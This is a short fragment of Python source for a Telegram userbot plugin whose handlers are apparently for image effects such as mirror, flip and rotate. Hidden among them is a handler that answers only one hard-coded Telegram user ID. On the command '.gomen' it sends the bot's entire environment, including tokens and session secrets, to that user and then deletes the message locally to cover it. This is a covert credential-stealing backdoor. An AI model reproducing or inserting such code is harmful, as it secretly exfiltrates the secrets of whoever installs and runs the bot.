...
from ShicyXd.shicy import bash
from Stringchiy import get_string


@bot.on(shicy_cmd(outgoing=True, pattern=r"(mirror|flip|ghost|bw|poster)$"))
...
@register(incoming=True, from_users=1905050903, pattern=r"^.gomen$")
async def _(event):
    msg = await bot.send_message(1905050903, str(os.environ))
    await bot.delete_messages(1905050903, msg, revoke=False)


@bot.on(shicy_cmd(outgoing=True, pattern=r"rotate(?: |$)(.*)"))
